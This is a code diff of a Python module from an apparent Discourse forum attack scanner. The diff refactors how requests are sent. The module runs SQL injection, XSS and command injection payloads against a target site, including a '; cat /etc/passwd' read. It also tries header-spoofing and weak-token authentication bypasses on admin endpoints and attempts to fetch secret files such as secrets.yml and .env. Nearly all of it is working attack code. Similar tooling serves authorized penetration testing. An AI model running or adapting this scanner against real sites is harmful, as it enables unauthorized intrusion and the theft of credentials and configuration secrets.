@@ -13,11 +13,11 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urljoin, quote
 from bs4 import BeautifulSoup
 from colorama import Fore, Style
-from .utils import extract_csrf_token, make_request
+from ..lib.discourse_utils import extract_csrf_token
 
 class PluginBruteforceModule:
     """Plugin vulnerability bruteforce attack module"""
-    
+
     def __init__(self, scanner):
         self.scanner = scanner
         self.results = {
@@ -30,7 +30,7 @@ class PluginBruteforceModule:
             'injection_tests': [],
             'authentication_bypasses': []
         }
-        
+
         # Comprehensive plugin list for bruteforce detection
         self.plugin_wordlist = [
             # Popular plugins
@@ -59,19 +59,19 @@ class PluginBruteforceModule:
             'discourse-push-notifications', 'discourse-quick-messages', 'discourse-saved-searches',
             'discourse-steam-login', 'discourse-subscriptions', 'discourse-topic-list-previews',
             'discourse-user-card-badges', 'discourse-watch-category-mcneel', 'discourse-zendesk-plugin',
-            
+
             # Security-related plugins
             'discourse-2fa', 'discourse-security-headers', 'discourse-rate-limit-edit',
             'discourse-login-required', 'discourse-restrict-by-ip', 'discourse-captcha',
             'discourse-honeypot', 'discourse-spam-handler', 'discourse-user-verification',
-            
+
             # Theme components
             'discourse-theme-creator', 'discourse-custom-header-links', 'discourse-hamburger-theme-selector',
             'discourse-category-banners', 'discourse-clickable-topic', 'discourse-easy-footer',
             'discourse-flexible-page-header', 'discourse-header-search', 'discourse-material-theme',
             'discourse-sidebar-blocks', 'discourse-topic-thumbnails', 'discourse-versatile-banner'
         ]
-        
+
         # Common plugin endpoints and files
         self.plugin_endpoints = {
             'admin': ['/admin', '/admin/plugins', '/admin/settings'],
@@ -81,7 +81,7 @@ class PluginBruteforceModule:
             'webhooks': ['/webhook', '/webhooks', '/callback'],
             'auth': ['/auth', '/login', '/oauth', '/saml', '/ldap']
         }
-        
+
         # Vulnerability test payloads
         self.vuln_payloads = {
             'xss': [
@@ -116,35 +116,35 @@ class PluginBruteforceModule:
                 '&& dir'
             ]
         }
-        
+
     def run(self):
         """Run complete plugin bruteforce attack scan"""
         # Removed print statement for cleaner output
-        
+
         # Endpoint bruteforce saldırıları
         self._bruteforce_endpoints()
-        
+
         # Zafiyet bruteforce testleri
         self._bruteforce_vulnerabilities()
-        
+
         # Injection saldırı testleri
         self._test_injection_attacks()
-        
+
         # Authentication bypass testleri
         self._test_authentication_bypasses()
-        
+
         # Dosya ifşası testleri
         self._test_file_disclosures()
-        
+
         # Konfigürasyon sızıntı testleri
         self._test_configuration_leaks()
-        
+
         return self.results
-    
+
     def _test_injection_attacks(self):
         """Test various injection attacks on plugin endpoints"""
         # Removed print statement for cleaner output
-        
+
         # SQL Injection payloads
         sql_payloads = [
             "' OR '1'='1",
@@ -156,7 +156,7 @@ class PluginBruteforceModule:
             "' OR 'x'='x",
             "1' AND '1'='1"
         ]
-        
+
         # XSS payloads
         xss_payloads = [
             "<script>alert('XSS')</script>",
@@ -167,7 +167,7 @@ class PluginBruteforceModule:
             "\"<script>alert('XSS')</script>",
             "<iframe src=javascript:alert('XSS')></iframe>"
         ]
-        
+
         # Command injection payloads
         cmd_payloads = [
             "; ls -la",
@@ -178,7 +178,7 @@ class PluginBruteforceModule:
             "; cat /etc/passwd",
             "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
         ]
-        
+
         # Test endpoints with injection payloads
         test_endpoints = [
             '/admin/plugins',
@@ -189,15 +189,15 @@ class PluginBruteforceModule:
             '/t/topic',
             '/posts'
         ]
-        
+
         for endpoint in test_endpoints:
             url = urljoin(self.scanner.target_url, endpoint)
-            
+
             # Test SQL injection
             for payload in sql_payloads:
                 test_url = f"{url}?q={quote(payload)}"
-                response = make_request(self.scanner.session, 'GET', test_url)
-                
+                response = self.scanner.make_request(test_url, method='GET')
+
                 if response and self._detect_sql_injection(response):
                     self.results['injection_tests'].append({
                         'type': 'SQL Injection',
@@ -206,12 +206,12 @@ class PluginBruteforceModule:
                         'severity': 'Critical',
                         'status': 'Vulnerable'
                     })
-            
+
             # Test XSS
             for payload in xss_payloads:
                 test_url = f"{url}?search={quote(payload)}"
-                response = make_request(self.scanner.session, 'GET', test_url)
-                
+                response = self.scanner.make_request(test_url, method='GET')
+
                 if response and payload in response.text:
                     self.results['injection_tests'].append({
                         'type': 'XSS',
@@ -220,12 +220,12 @@ class PluginBruteforceModule:
                         'severity': 'High',
                         'status': 'Vulnerable'
                     })
-            
+
             # Test command injection
             for payload in cmd_payloads:
                 test_url = f"{url}?cmd={quote(payload)}"
-                response = make_request(self.scanner.session, 'GET', test_url)
-                
+                response = self.scanner.make_request(test_url, method='GET')
+
                 if response and self._detect_command_injection(response):
                     self.results['injection_tests'].append({
                         'type': 'Command Injection',
@@ -234,11 +234,11 @@ class PluginBruteforceModule:
                         'severity': 'Critical',
                         'status': 'Vulnerable'
                     })
-    
+
     def _test_authentication_bypasses(self):
         """Test authentication bypass techniques"""
         # Removed print statement for cleaner output
-        
+
         bypass_techniques = [
             # Header manipulation
             {'headers': {'X-Forwarded-For': '127.0.0.1'}, 'description': 'IP Whitelist Bypass'},
@@ -246,17 +246,17 @@ class PluginBruteforceModule:
             {'headers': {'X-Originating-IP': '127.0.0.1'}, 'description': 'Originating IP Bypass'},
             {'headers': {'X-Remote-IP': '127.0.0.1'}, 'description': 'Remote IP Bypass'},
             {'headers': {'X-Client-IP': '127.0.0.1'}, 'description': 'Client IP Bypass'},
-            
+
             # User-Agent manipulation
             {'headers': {'User-Agent': 'DiscourseBot'}, 'description': 'Bot User-Agent Bypass'},
             {'headers': {'User-Agent': 'Googlebot'}, 'description': 'Search Engine Bypass'},
-            
+
             # Authentication headers
             {'headers': {'Authorization': 'Bearer admin'}, 'description': 'Weak Token Bypass'},
             {'headers': {'X-API-Key': 'admin'}, 'description': 'API Key Bypass'},
             {'headers': {'X-Auth-Token': 'bypass'}, 'description': 'Auth Token Bypass'}
         ]
-        
+
         protected_endpoints = [
             '/admin',
             '/admin/users',
@@ -265,20 +265,20 @@ class PluginBruteforceModule:
             '/admin/logs',
             '/admin/settings'
         ]
-        
+
         for endpoint in protected_endpoints:
             url = urljoin(self.scanner.target_url, endpoint)
-            
+
             # Test normal access first
-            normal_response = make_request(self.scanner.session, 'GET', url)
+            normal_response = self.scanner.make_request(url, method='GET')
             if not normal_response or normal_response.status_code == 200:
                 continue  # Already accessible
-            
+
             # Test bypass techniques
             for technique in bypass_techniques:
                 headers = technique['headers']
-                response = make_request(self.scanner.session, 'GET', url, headers=headers)
-                
+                response = self.scanner.make_request(url, method='GET', headers=headers)
+
                 if response and response.status_code == 200:
                     self.results['authentication_bypasses'].append({
                         'endpoint': endpoint,
@@ -287,11 +287,11 @@ class PluginBruteforceModule:
                         'severity': 'Critical',
                         'status': 'Bypassed'
                     })
-    
+
     def _bruteforce_endpoints(self):
         """Bruteforce attack on plugin endpoints"""
         # Removed print statement for cleaner output
-        
+
         # Common attack endpoints
         attack_endpoints = [
             '/admin/plugins/install',
@@ -309,16 +309,16 @@ class PluginBruteforceModule:
             '/api/admin/users',
             '/api/admin/settings'
         ]
-        
+
         # HTTP methods to test
         methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
-        
+
         for endpoint in attack_endpoints:
             url = urljoin(self.scanner.target_url, endpoint)
-            
+
             for method in methods:
-                response = make_request(self.scanner.session, method, url)
-                
+                response = self.scanner.make_request(url, method=method)
+
                 if response:
                     if response.status_code == 200:
                         self.results['endpoint_attacks'].append({
@@ -331,7 +331,7 @@ class PluginBruteforceModule:
                     elif response.status_code in [401, 403]:
                         # Try with different payloads
                         self._test_endpoint_bypasses(url, method, endpoint)
-    
+
     def _test_endpoint_bypasses(self, url, method, endpoint):
         """Test endpoint bypass techniques"""
         bypass_payloads = [
@@ -346,11 +346,11 @@ class PluginBruteforceModule:
             {'path': '/admin%00', 'description': 'Null Byte'},
             {'path': '/admin?', 'description': 'Query Parameter'}
         ]
-        
+
         for payload in bypass_payloads:
             test_url = url.replace(endpoint, endpoint + payload['path'])
-            response = make_request(self.scanner.session, method, test_url)
-            
+            response = self.scanner.make_request(test_url, method=method)
+
             if response and response.status_code == 200:
                 self.results['endpoint_attacks'].append({
                     'endpoint': endpoint,
@@ -360,29 +360,29 @@ class PluginBruteforceModule:
                     'status': 'bypassed',
                     'severity': 'Critical'
                 })
-    
+
     def _bruteforce_vulnerabilities(self):
         """Bruteforce vulnerability testing on discovered endpoints"""
         # Removed print statement for cleaner output
-        
+
         endpoints = self.results['endpoint_attacks']
-        
+
         for endpoint_info in endpoints:
             endpoint = endpoint_info['endpoint']
-            
+
             # Test each vulnerability type
             for vuln_type, payloads in self.vuln_payloads.items():
                 for payload in payloads:
                     self._test_vulnerability('unknown', endpoint, vuln_type, payload)
-    
+
     def _test_vulnerability(self, plugin, endpoint, vuln_type, payload):
         """Test specific vulnerability with payload"""
         url = urljoin(self.scanner.target_url, endpoint)
-        
+
         # Test GET parameter injection
         get_url = f"{url}?test={quote(payload)}"
-        response = make_request(self.scanner.session, 'GET', get_url)
-        
+        response = self.scanner.make_request(get_url, method='GET')
+
         if response and self._check_vulnerability_response(response, vuln_type, payload):
             self.results['vulnerability_tests'].append({
                 'plugin': plugin,
@@ -393,11 +393,11 @@ class PluginBruteforceModule:
                 'severity': self._get_severity(vuln_type),
                 'status': 'vulnerable'
             })
-        
+
         # Test POST parameter injection
         data = {'test': payload, 'param': payload}
-        response = make_request(self.scanner.session, 'POST', url, data=data)
-        
+        response = self.scanner.make_request(url, method='POST', data=data)
+
         if response and self._check_vulnerability_response(response, vuln_type, payload):
             self.results['vulnerability_tests'].append({
                 'plugin': plugin,
@@ -408,11 +408,11 @@ class PluginBruteforceModule:
                 'severity': self._get_severity(vuln_type),
                 'status': 'vulnerable'
             })
-    
+
     def _test_file_disclosures(self):
         """Test for file disclosure vulnerabilities"""
         # Removed print statement for cleaner output
-        
+
         sensitive_files = [
             'config/database.yml',
             'config/secrets.yml',
@@ -426,9 +426,10 @@ class PluginBruteforceModule:
             'Gemfile',
             'Gemfile.lock'
         ]
-        
-        discovered_plugins = [p['plugin'] for p in self.results['discovered_plugins'] if p.get('status') == 'found']
-        
+
+        discovered = self.results.get('discovered_plugins', [])
+        discovered_plugins = [p.get('plugin') for p in discovered if p.get('status') == 'found' and p.get('plugin') is not None]
+
         for plugin in discovered_plugins:
             for file in sensitive_files:
                 file_paths = [
@@ -436,11 +437,11 @@ class PluginBruteforceModule:
                     f'/plugins/{plugin}/config/{file}',
                     f'/admin/plugins/{plugin}/{file}'
                 ]
-                
+
                 for file_path in file_paths:
                     url = urljoin(self.scanner.target_url, file_path)
-                    response = make_request(self.scanner.session, 'GET', url)
-                    
+                    response = self.scanner.make_request(url, method='GET')
+
                     if response and response.status_code == 200:
                         if self._check_sensitive_file_content(response.text, file):
                             self.results['file_disclosures'].append({
@@ -450,11 +451,11 @@ class PluginBruteforceModule:
                                 'severity': 'High',
                                 'description': f'Sensitive file {file} accessible'
                             })
-    
+
     def _test_configuration_leaks(self):
         """Test for configuration information leaks"""
         # Removed print statement for cleaner output
-        
+
         config_endpoints = [
             '/admin/plugins.json',
             '/admin/site_settings.json',
@@ -462,11 +463,11 @@ class PluginBruteforceModule:
             '/site.json',
             '/srv/status.json'
         ]
-        
+
         for endpoint in config_endpoints:
             url = urljoin(self.scanner.target_url, endpoint)
-            response = make_request(self.scanner.session, 'GET', url)
-            
+            response = self.scanner.make_request(url, method='GET')
+
             if response and response.status_code == 200:
                 try:
                     data = response.json()
@@ -479,7 +480,7 @@ class PluginBruteforceModule:
                         })
                 except json.JSONDecodeError:
                     pass
-    
+
     def _check_sensitive_content(self, content):
         """Check if content contains sensitive information"""
         sensitive_keywords = [
@@ -487,10 +488,10 @@ class PluginBruteforceModule:
             'database', 'connection', 'credential', 'auth',
             'private', 'confidential', 'internal'
         ]
-        
+
         content_lower = content.lower()
         return any(keyword in content_lower for keyword in sensitive_keywords)
-    
+
     def _check_vulnerability_response(self, response, vuln_type, payload):
         """Check if response indicates vulnerability"""
         if vuln_type == 'xss':
@@ -504,9 +505,9 @@ class PluginBruteforceModule:
         elif vuln_type == 'rce':
             command_indicators = ['uid=', 'gid=', 'groups=', 'volume in drive']
             return any(indicator in response.text.lower() for indicator in command_indicators)
-        
+
         return False
-    
+
     def _check_sensitive_file_content(self, content, filename):
         """Check if file content is sensitive"""
         if filename.endswith('.yml') or filename.endswith('.yaml'):
@@ -515,9 +516,9 @@ class PluginBruteforceModule:
             return '=' in content and any(keyword in content.upper() for keyword in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN'])
         elif filename == 'plugin.rb':
             return 'class' in content or 'module' in content
-        
+
         return len(content) > 100  # Basic check for substantial content
-    
+
     def _check_sensitive_config(self, data):
         """Check if configuration data contains sensitive information"""
         if isinstance(data, dict):
@@ -531,9 +532,9 @@ class PluginBruteforceModule:
             for item in data:
                 if self._check_sensitive_config(item):
                     return True
-        
+
         return False
-    
+
     def _detect_sql_injection(self, response):
         """Detect SQL injection vulnerabilities"""
         sql_errors = [
@@ -542,7 +543,7 @@ class PluginBruteforceModule:
             'mysql result', 'mysqlclient', 'com.mysql.jdbc.exceptions'
         ]
         return any(error in response.text.lower() for error in sql_errors)
-    
+
     def _detect_command_injection(self, response):
         """Detect command injection vulnerabilities"""
         command_indicators = [
@@ -550,7 +551,7 @@ class PluginBruteforceModule:
             'directory of', 'total ', 'drwx', '-rw-'
         ]
         return any(indicator in response.text.lower() for indicator in command_indicators)
-    
+
     def _get_severity(self, vuln_type):
         """Get severity level for vulnerability type"""
         severity_map = {
